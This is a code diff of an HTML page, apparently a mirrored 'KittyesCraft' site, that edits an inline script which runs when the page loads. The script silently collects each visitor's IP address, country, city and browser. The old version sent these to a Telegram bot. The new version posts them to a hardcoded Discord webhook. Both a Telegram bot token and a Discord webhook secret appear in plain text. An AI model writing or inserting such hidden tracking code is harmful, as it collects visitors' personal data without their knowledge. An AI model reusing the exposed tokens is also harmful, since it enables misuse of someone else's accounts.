@@ -674,72 +674,67 @@ fetch('http://ip-api.com/json/?fields=66846719')
 
     <!-- TELEGRAM BOT -->
  <!-- TELEGRAM BOT - EN STABİL VERSİYON -->
+<!-- DISCORD WEBHOOK - SON VERSİYON -->
 <script>
 (function() {
-    const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
-    const chatId = "1504410647";
+    // --- BURAYA KENDİ DISCORD WEBHOOK URL'İNİ YAPIŞTIR ---
+    const webhookUrl = "https://discord.com/api/webhooks/1478105317223960620/IjRtkev0Mww9pdhLCLlT4NwUZGgbaIx2o7NR1xZk0lxqXZCLChu7hy4d4XY_HmJZYYzC"; 
+    // ---------------------------------------------------
 
-    // Tarayıcı tespiti (kesin)
     function getBrowser() {
         const ua = navigator.userAgent;
-        if (ua.includes("Edg/") || ua.includes("Edge/") || ua.includes("EdgA")) return "Microsoft Edge";
-        if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+        if (ua.includes("Edg/") || ua.includes("Edge/")) return "Microsoft Edge";
         if (ua.includes("Firefox")) return "Mozilla Firefox";
-        if (ua.includes("Chrome") && !ua.includes("Edg")) return "Google Chrome";
-        if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
-        return navigator.userAgent.substring(0, 30);
+        if (ua.includes("Chrome")) return "Google Chrome";
+        if (ua.includes("Safari")) return "Safari";
+        return "Bilinmiyor";
     }
 
-    // 1. API'den IP ve konum almayı dene
-    fetch('https://ipapi.co/json/')  // Eski dost, bazen çalışır
+    // HTTPS API ile IP ve konum al
+    fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            if (data.ip) {
-                const browser = getBrowser();
-                const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                                `🌐 <b>IP:</b> ${data.ip}\n` +
-                                `📍 <b>Konum:</b> ${data.country_name || '?'} / ${data.city || '?'}\n` +
-                                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                                `🚀 <b>Tarayıcı:</b> ${browser}`;
+            if (!data.ip) throw new Error("IP alınamadı");
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
-                });
-            } else {
-                throw new Error("IP alınamadı");
-            }
+            const browser = getBrowser();
+            
+            // Discord Embed formatında mesaj oluştur [citation:8][citation:10]
+            const embed = {
+                embeds: [{
+                    title: '🤡 KittyesCraft Giriş Yapıldı',
+                    color: 16744879, // Pembe renk
+                    fields: [
+                        { name: '🌐 IP', value: data.ip, inline: true },
+                        { name: '📍 Konum', value: `${data.country_name} / ${data.city}`, inline: true },
+                        { name: '🚀 Tarayıcı', value: browser, inline: true },
+                        { name: '⏰ Zaman', value: new Date().toLocaleString('tr-TR'), inline: false }
+                    ],
+                    footer: { text: 'KittyesCraft Bot' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Discord'a gönder ( HTTPS -> HTTPS, sorun yok! )
+            return fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            });
         })
-        .catch(() => {
-            // 2. Hata olursa sadece IP al (ipify her zaman çalışır)
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    const browser = getBrowser();
-                    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                                    `🌐 <b>IP:</b> ${ipData.ip}\n` +
-                                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                                    `🚀 <b>Tarayıcı:</b> ${browser}`;
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
-                    });
+        .then(response => {
+            if (response.ok) console.log('✅ Discord\'a mesaj gönderildi');
+            else console.log('❌ Discord hatası:', response.status);
+        })
+        .catch(error => {
+            console.error('Hata:', error);
+            // Hata olursa basit mesaj dene
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    content: `✅ Giriş yapıldı! (Detay alınamadı) - ${new Date().toLocaleString('tr-TR')}` 
                 })
-                .catch(() => {
-                    // 3. Son çare: IP'siz mesaj
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: `✅ Giriş yapıldı! ${new Date().toLocaleString('tr-TR')}`,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                });
+            });
         });
 })();
 </script>
@@ -804,6 +799,7 @@ fetch('http://ip-api.com/json/?fields=66846719')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
